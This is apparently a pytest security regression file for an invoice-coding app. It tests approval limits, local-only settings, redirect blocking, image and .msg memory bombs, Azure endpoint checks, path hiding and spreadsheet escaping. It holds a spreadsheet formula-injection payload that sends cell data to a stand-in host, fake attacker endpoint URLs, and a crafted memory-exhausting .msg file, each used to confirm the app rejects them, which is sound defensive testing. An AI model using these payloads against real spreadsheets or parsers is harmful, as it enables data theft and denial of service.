"""Sweep 4, platform and security (B-970 to B-989): the second-approval controls, Settings from this computer only on
the office network, the offline guarantee through redirects, image and .msg bombs, the Azure host, local paths on
error pages, Windows reserved file names, upload sizes and the .xlsx export's formula-like text."""

from __future__ import annotations

import shutil

import pytest
from fastapi.testclient import TestClient

from ap_coder.ai import local_llm
from ap_coder.core.store import APPROVED, PENDING, Store
from ap_coder.web.app import create_app

from .conftest import next_second
from .webclient import PAGE, add_clean, web_settings

REAL_FETCH = local_llm._fetch_json  # conftest replaces it for every test (no real LM Studio)


@pytest.fixture(scope="module")
def demo_db(demo_template):
    """The demo invoices, made once a run (tests/conftest.py)."""
    return demo_template


@pytest.fixture
def store(demo_db, tmp_path):
    target = tmp_path / "private" / "ap_coder.db"
    target.parent.mkdir(parents=True)
    shutil.copy(demo_db, target)
    return Store(target)


def local(app) -> TestClient:
    return TestClient(app, base_url="http://localhost", client=("127.0.0.1", 50000), follow_redirects=False)


def colleague(app, address: str = "10.0.0.5", name: str = "Ana") -> TestClient:
    client = TestClient(app, base_url="http://localhost", client=(address, 50000), follow_redirects=False)
    assert client.post("/who", data={"name": name}, headers=PAGE).json()["ok"]
    return client


def _usd(store: Store, total: float = 7570.0) -> int:
    return add_clean(store, currency="USD", grand_total=total)


# --- 1. The second approval can't be skipped by changing the limit or the rates -----------------------------------


def test_lowering_the_limit_just_before_approving_does_not_skip_a_second_approval_that_was_due(store):
    store.set_setting("approval_limit", "1.00", actor="Pilot")
    invoice_id = add_clean(store)
    store.set_setting("approval_limit", "0.00", actor="Clerk")  # the clerk turns the limit off, approves alone
    store.approve_invoice(invoice_id, store.get_invoice(invoice_id)["ai_output"], "Clerk", login="clerk")
    assert store.get_invoice(invoice_id)["status"] == PENDING
    approved = next(e for e in store.events(invoice_id) if e["action"] == "approved")
    assert approved["detail"]["needs_second"] and approved["detail"]["limit"] == 1.0  # the limit in force, kept


def test_a_lower_exchange_rate_set_after_the_invoice_came_in_does_not_skip_its_second_approval(store):
    store.set_setting("approval_limit", "1000.00")
    store.set_setting("fx_rates", "USD=1.37")
    next_second()  # the events' times are to the second (B-970)
    invoice_id = _usd(store)
    store.set_setting("fx_rates", "USD=0.05")
    store.approve_invoice(invoice_id, store.get_invoice(invoice_id)["ai_output"], "Clerk", login="clerk")
    assert store.get_invoice(invoice_id)["status"] == PENDING
    approved = next(e for e in store.events(invoice_id) if e["action"] == "approved")
    assert approved["detail"]["rate"] == 1.37


def test_an_invoice_that_came_in_after_the_change_follows_the_new_limit(store):
    store.set_setting("approval_limit", "1.00")
    store.set_setting("approval_limit", "0.00")
    next_second()  # the events' times are to the second (B-970)
    invoice_id = add_clean(store)
    store.approve_invoice(invoice_id, store.get_invoice(invoice_id)["ai_output"], "Clerk", login="clerk")
    assert store.get_invoice(invoice_id)["status"] == APPROVED


def test_a_change_of_the_limit_or_the_rates_is_in_the_audit_trail_with_its_old_and_new_values(store):
    app = create_app(web_settings(), store, start_reader=False)
    client = local(app)
    assert client.post("/settings/review", data={"approval_limit": "500"}, headers=PAGE).json()["ok"]
    assert client.post("/settings/review", data={"fx_rates": "USD=1.37"}, headers=PAGE).json()["ok"]
    changes = [e["detail"] for e in store.events(actions=["settings_changed"]) if e["detail"].get("changes")]
    found = {k: v for d in changes for k, v in d["changes"].items()}
    assert found["approval_limit"] == {"from": "", "to": "500.00"}
    assert found["fx_rates"] == {"from": "", "to": "USD=1.37"}
    from ap_coder.core import audit

    event = next(e for e in store.events(actions=["settings_changed"]) if "approval_limit" in e["detail"]["keys"])
    assert "500.00" in audit.describe(event)


@pytest.mark.parametrize("rates", ["USD=0", "USD=0.0001", "EUR 0.004"])
def test_an_exchange_rate_of_zero_or_absurdly_small_is_refused(store, rates):
    app = create_app(web_settings(), store, start_reader=False)
    answer = local(app).post("/settings/review", data={"fx_rates": rates}, headers=PAGE).json()
    assert not answer["ok"] and "rate" in answer["error"]
    assert store.get_setting("fx_rates") == ""


def test_a_small_rate_is_kept_for_a_currency_whose_unit_is_worth_less_than_a_cent(store):
    app = create_app(web_settings(), store, start_reader=False)
    assert local(app).post("/settings/review", data={"fx_rates": "JPY=0.0093"}, headers=PAGE).json()["ok"]
    assert store.fx_rates()["JPY"] == 0.0093


def test_a_tiny_rate_already_saved_is_no_rate(store):
    store.set_setting("fx_rates", "USD=0.0001")
    assert "USD" not in store.fx_rates()


@pytest.mark.parametrize(
    "method, path",
    [
        ("get", "/settings"),
        ("get", "/settings/review"),
        ("get", "/settings/data"),
        ("post", "/settings/review"),
        ("post", "/settings/data/backup"),
        ("post", "/settings/data/backup-copy"),
        ("post", "/settings/data/restore"),
        ("get", "/settings/data/backups/x.db"),
        ("get", "/settings/azure-check"),
        ("post", "/settings/azure-check"),
    ],
)
def test_on_the_office_network_settings_data_and_azure_are_only_from_this_computer(store, method, path):
    app = create_app(web_settings(), store, address="0.0.0.0", start_reader=False)
    answer = getattr(colleague(app), method)(path, headers=PAGE)
    assert answer.status_code == 403
    assert "computer running AP Coder" in answer.text
    if method == "get":
        assert local(app).get(path).status_code in (200, 303, 307, 404)


# --- 2. The offline guarantee holds through a redirect, and a name is judged by the address it has ----------------


@pytest.fixture
def redirecting():
    """A model server on 127.0.0.1 that answers everything with a redirect to another server (also on this computer
    here, so the test sends nothing out), which counts the requests it gets."""
    import http.server
    import threading

    hits = []

    class Target(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def _answer(self):  # pragma: no cover - reached only when a redirect is followed
            hits.append((self.path, self.headers.get("Authorization")))
            self.send_response(200)
            self.send_header("content-type", "application/json")
            self.end_headers()
            self.wfile.write(b'{"data": []}')

        do_GET = do_POST = _answer

    target = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Target)

    class Redirect(http.server.BaseHTTPRequestHandler):
        def log_message(self, *args):
            pass

        def _answer(self):
            self.rfile.read(int(self.headers.get("content-length") or 0))
            self.send_response(302)  # followed by urllib for a POST too (as a GET), and by httpx
            self.send_header("Location", f"http://127.0.0.1:{target.server_address[1]}{self.path}")
            self.send_header("content-length", "0")
            self.end_headers()

        do_GET = do_POST = _answer

    source = http.server.ThreadingHTTPServer(("127.0.0.1", 0), Redirect)
    for server in (target, source):
        threading.Thread(target=server.serve_forever, daemon=True).start()
    yield f"http://127.0.0.1:{source.server_address[1]}", hits
    for server in (target, source):
        server.shutdown()
        server.server_close()


def test_the_model_list_is_not_fetched_from_where_a_redirect_points(redirecting):
    url, hits = redirecting
    with pytest.raises(OSError):
        REAL_FETCH(f"{url}/v1/models", "secret", 3)
    assert hits == []


def test_the_chat_model_client_does_not_follow_a_redirect(redirecting):
    import openai

    from ap_coder.core.config import LocalLLMSettings

    url, hits = redirecting
    client = local_llm.build_local_client(LocalLLMSettings(base_url=f"{url}/v1"))
    with pytest.raises(openai.APIError):
        client.chat.completions.create(model="m", messages=[{"role": "user", "content": "INVOICE TEXT"}])
    assert hits == []


def test_the_page_reader_does_not_follow_a_redirect(redirecting):
    from ap_coder.ai import page_reader

    url, hits = redirecting
    with pytest.raises(page_reader.PageReaderError):
        page_reader._post_json(f"{url}/api/v0/x", {"a": 1}, "", 3)
    assert hits == []


@pytest.mark.parametrize(
    "name, address, here",
    [
        ("lmstudio.local", "93.184.216.34", False),  # a .local name that DNS gives an internet address
        ("gpu-box", "8.8.8.8", False),  # a bare name completed by the office DNS to an internet address
        ("gpu-box", "192.168.1.20", True),
        ("lmstudio.lan", "10.0.0.7", True),
    ],
)
def test_a_server_name_is_judged_by_the_address_it_resolves_to(monkeypatch, name, address, here):
    import socket

    from ap_coder.core import config

    monkeypatch.setattr(config.socket, "getaddrinfo",
                        lambda host, *a, **k: [(socket.AF_INET, socket.SOCK_STREAM, 6, "", (address, 0))])  # fmt: skip
    assert config._on_this_network(f"{name}:1234") is here


def test_a_name_that_does_not_resolve_is_judged_by_its_name(monkeypatch):
    from ap_coder.core import config

    def nothing(*args, **kwargs):
        raise OSError("no such name")

    monkeypatch.setattr(config.socket, "getaddrinfo", nothing)
    assert config._on_this_network("gpu-box:1234") and not config._on_this_network("example.com")


# --- 3. A small picture of a huge page is not decoded at full size ------------------------------------------------


@pytest.fixture
def small_limit(monkeypatch):
    """The picture limit brought down to 1 megapixel, so the test's pictures stay small."""
    from ap_coder.capture import layout

    monkeypatch.setattr(layout, "MAX_PICTURE_PIXELS", 1_000_000)
    from ap_coder.web import document

    document._png_cached.cache_clear()
    document._sizes_cached.cache_clear()


def test_a_picture_over_the_pixel_limit_is_refused_before_it_is_decoded(tmp_path, small_limit):
    from PIL import Image

    from ap_coder.capture.layout import CannotRead
    from ap_coder.web import document

    path = tmp_path / "huge.png"
    Image.new("L", (1200, 1200), 255).save(path)
    with pytest.raises(CannotRead, match="too large"):
        document.page_png(str(path), 1)


def test_a_huge_jpeg_is_read_at_a_reduced_size_and_keeps_its_page_size(tmp_path, small_limit):
    from PIL import Image

    from ap_coder.capture.layout import open_image

    path = tmp_path / "huge.jpg"
    Image.new("RGB", (1700, 2200), "white").save(path, dpi=(200, 200))
    with open_image(path) as img:
        img.load()
        assert img.width * img.height <= 1_000_000
        assert abs(img.width / img.info["dpi"][0] - 8.5) < 0.1  # still a letter-sized page


def test_only_the_tiff_page_asked_for_is_drawn(tmp_path, monkeypatch):
    from PIL import Image

    from ap_coder.capture import layout
    from ap_coder.web import document

    path = tmp_path / "three.tif"
    pages = [Image.new("L", (850, 1100), shade) for shade in (200, 220, 240)]
    pages[0].save(path, save_all=True, append_images=pages[1:])
    drawn = []
    real = layout.flatten_photo
    monkeypatch.setattr(layout, "flatten_photo", lambda pic: drawn.append(pic.size) or real(pic))
    assert document.page_png(str(path), 3)[:4] == b"\x89PNG"
    assert len(drawn) == 1


def test_a_picture_over_the_pixel_limit_is_refused_at_intake_in_plain_words(tmp_path, small_limit):
    from PIL import Image

    from ap_coder.capture.layout import CannotRead
    from ap_coder.intake import pictures

    path = tmp_path / "huge.png"
    Image.new("L", (1200, 1200), 255).save(path)
    with pytest.raises(CannotRead, match="too large"):
        pictures.to_pdf(path)
    assert path.exists()  # left where it was


# --- 4. A crafted .msg file does not take ten times its size in memory -----------------------------------------------


def test_a_msg_whose_fat_list_repeats_one_sector_takes_little_memory():
    import struct
    import tracemalloc

    from ap_coder.intake import msgfile

    size = 4_000_000
    header = bytearray(512)
    header[:8] = msgfile.SIGNATURE
    struct.pack_into("<HHH", header, 0x1A, 3, 0xFFFE, 9)
    struct.pack_into("<H", header, 0x20, 6)
    struct.pack_into("<II", header, 0x2C, 0, 0xFFFFFFFE)  # no FAT count to cut the list; no directory
    struct.pack_into("<IIIII", header, 0x38, 4096, 0xFFFFFFFE, 0, 0, 0x0FFFFFFF)  # the DIFAT starts at sector 0
    struct.pack_into("<109I", header, 0x4C, *([1] * 109))  # every FAT sector is sector 1
    difat = struct.pack("<127I", *([1] * 127)) + struct.pack("<I", 0)  # and the DIFAT points back at itself
    fat = struct.pack("<128I", *range(0x10000000, 0x10000000 + 128))
    data = bytes(header) + difat + fat + b"\0" * (size - 512 - len(difat) - len(fat))
    tracemalloc.start()
    try:
        with pytest.raises(msgfile.MsgError):
            msgfile.read_msg(data)
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < size


# --- 5. The Azure check contacts only an Azure Document Intelligence address ----------------------------------------


@pytest.mark.parametrize(
    "endpoint",
    ["https://collector.attacker.example/", "https://cognitiveservices.azure.com.evil.example/",
     "https://evilcognitiveservices.azure.com/", "https://x.openai.azure.com/"],
)  # fmt: skip
def test_the_azure_check_refuses_an_endpoint_that_is_not_azure_document_intelligence(store, endpoint, tmp_path,
                                                                                       monkeypatch):  # fmt: skip
    from ap_coder.ai import azure_check

    monkeypatch.setenv("AP_ENV_FILE", str(tmp_path / "test.env"))
    with pytest.raises(ValueError, match="Azure Document Intelligence"):
        azure_check.save_settings(store, enabled=True, endpoint=endpoint, api_key="k")
    assert azure_check.endpoint_host(endpoint) == ""


@pytest.mark.parametrize(
    "endpoint", ["https://ap-test.cognitiveservices.azure.com/", "https://westus2.api.cognitive.microsoft.com/"]
)
def test_the_azure_check_takes_an_azure_document_intelligence_endpoint(endpoint):
    from ap_coder.ai import azure_check

    assert azure_check.endpoint_host(endpoint) == endpoint.split("/")[2]


# --- 6. A colleague's browser is not shown this computer's folders --------------------------------------------------


def _network(store):
    return create_app(web_settings(), store, address="0.0.0.0", start_reader=False)


def _gone(store, tmp_path, error: str = "") -> int:
    from .conftest import SAMPLE_STEM, SAMPLES

    secret = tmp_path / "Secret Folder" / "Supplier 123.pdf"
    secret.parent.mkdir()
    shutil.copy(SAMPLES / f"{SAMPLE_STEM}.pdf", secret)
    invoice_id = store.add_invoice(secret, None if error else {"line_items": []}, {}, error=error)
    secret.unlink()
    return invoice_id


def test_a_missing_file_is_named_without_its_folder_to_a_colleague(store, tmp_path):
    app = _network(store)
    invoice_id = _gone(store, tmp_path)
    answer = colleague(app).get(f"/review/{invoice_id}/page/1.png")
    assert answer.status_code == 404 and "Supplier 123.pdf" in answer.text and "Secret Folder" not in answer.text
    page = colleague(app).get(f"/review/{invoice_id}")
    assert "Secret Folder" not in page.text
    assert "Secret Folder" in local(app).get(f"/review/{invoice_id}/page/1.png").text  # this computer: all of it


def test_retrying_a_missing_file_names_it_without_its_folder_to_a_colleague(store, tmp_path):
    app = _network(store)
    invoice_id = _gone(store, tmp_path, error="could not read")
    answer = colleague(app).post(f"/review/{invoice_id}/retry", headers=PAGE).json()
    assert not answer["ok"] and "Supplier 123.pdf" in answer["error"] and "Secret Folder" not in answer["error"]


def test_an_error_page_shows_a_colleague_no_folder_and_no_log_path(store):
    app = _network(store)

    def boom():
        raise FileNotFoundError(2, "No such file or directory", "/home/someone/Secret Folder/x.db")

    app.add_api_route("/boom", boom, methods=["GET"])
    client = colleague(app)
    page = client.get("/boom", headers={"accept": "text/html"})
    assert page.status_code == 500
    assert "Secret Folder" not in page.text and "dashboard-errors.log" not in page.text and "x.db" in page.text
    mine = local(app).get("/boom", headers={"accept": "text/html"})
    assert "dashboard-errors.log" in mine.text


def test_healthz_tells_a_colleague_only_that_it_is_up(store):
    app = _network(store)
    found = TestClient(app, base_url="http://localhost", client=("10.0.0.5", 50000)).get("/healthz").json()
    assert found == {"ok": True, "app": "ap-coder"}
    assert "folder" in local(app).get("/healthz").json()


# --- 7. Windows' reserved names, and the size of an invoice uploaded ------------------------------------------------


@pytest.mark.parametrize(
    "name, saved",
    [("CON.pdf", "_CON.pdf"), ("nul.pdf", "_nul.pdf"), ("COM1.jpg", "_COM1.jpg"), ("aux", "_aux"),
     ("lpt9.tar.gz", "_lpt9.tar.gz"), ("Con .pdf", "_Con .pdf"), ("CONTRACT.pdf", "CONTRACT.pdf"),
     ("COM10.pdf", "COM10.pdf")],
)  # fmt: skip
def test_a_windows_reserved_name_is_saved_with_an_underscore_before_it(name, saved):
    from ap_coder.intake.mailbox import safe_name
    from ap_coder.web.pages.process import safe_file_name

    assert safe_name(name) == saved and safe_file_name(name) == saved


def test_an_invoice_upload_over_the_size_limit_is_not_saved(store, monkeypatch):
    import json

    from ap_coder.web.pages import process

    monkeypatch.setattr(process, "MAX_UPLOAD_BYTES", 1000)
    app = create_app(web_settings(), store, start_reader=False)
    client = local(app)
    big = b"%PDF-1.4\n" + b"0" * 2000
    answer = client.post("/process/upload", files=[("files", ("big.pdf", big, "application/pdf"))], headers=PAGE)
    assert answer.json()["ok"], answer.text
    job = app.state.jobs.get(process.JOB)
    job.wait(30)
    assert "larger than" in json.dumps(job.snapshot())
    assert not (process.invoice_dir(store) / "big.pdf").exists()


# --- 9. The CSV is for the ERP loader; the .xlsx is the one to open in Excel -------------------------------------


@pytest.mark.parametrize("fmt", ["csv", "custom"])
def test_the_exports_page_says_the_csv_is_for_the_erp_loader_and_excel_takes_the_xlsx(store, fmt):
    app = create_app(web_settings(), store, start_reader=False)
    page = local(app).get(f"/exports?fmt={fmt}").text
    assert "for the ERP loader" in page and "to look at it in Excel, use the .xlsx export" in page


def test_the_xlsx_export_keeps_formula_like_text_as_text(store):
    import io

    from openpyxl import load_workbook

    from ap_coder.erp import exports

    invoice = store.get_invoice(store.list_invoices(APPROVED)[0]["id"])
    final = dict(invoice["final_output"], vendor_name='=HYPERLINK("http://x.example/?"&A1,"Click")',
                 invoice_number="+A-100", po_number="@SUM(A1)")  # fmt: skip
    workbook = load_workbook(io.BytesIO(exports.build_xlsx([dict(invoice, final_output=final)])))
    texts = [c for ws in workbook for row in ws.iter_rows() for c in row if isinstance(c.value, str)]
    risky = [c for c in texts if c.value.startswith(("=", "+", "-", "@"))]
    assert {c.value for c in risky} >= {final["vendor_name"], "+A-100", "@SUM(A1)"}
    assert all(c.data_type == "s" for c in risky)


# --- 10. No one's own folder in the docs ----------------------------------------------------------------------------


def test_the_docs_name_no_one_s_own_folder():
    """A path in the docs is a generic one (``C:\\Users\\<you>``, ``~/APCoder``), never a developer's own."""
    import re
    from pathlib import Path

    root = Path(__file__).resolve().parent.parent
    own = re.compile(r"/home/(?!<)[\w.-]+/|/Users/(?!<|you\b)[\w.-]+/|[A-Z]:\\Users\\(?!<|you\\)[\w.-]+\\")
    found = [f"{p.relative_to(root)}: {m.group(0)}" for p in [*root.glob("*.md"), *(root / "docs").glob("*.md")]
             if p.name != "BUGS.md" for m in own.finditer(p.read_text(encoding="utf-8"))]  # fmt: skip
    assert not found, found


# --- 11. Going back after an update is written down ----------------------------------------------------------------


def test_the_way_back_after_an_update_is_written_down_with_the_backup_the_update_makes():
    from pathlib import Path

    from ap_coder.core.store import _base

    root = Path(__file__).resolve().parent.parent
    doc = (root / "docs" / "UPGRADING.md").read_text(encoding="utf-8")
    assert "## Going back to the previous version" in doc
    made = "before-update-from-schema-"
    assert made in Path(_base.__file__).read_text(encoding="utf-8") and made in doc
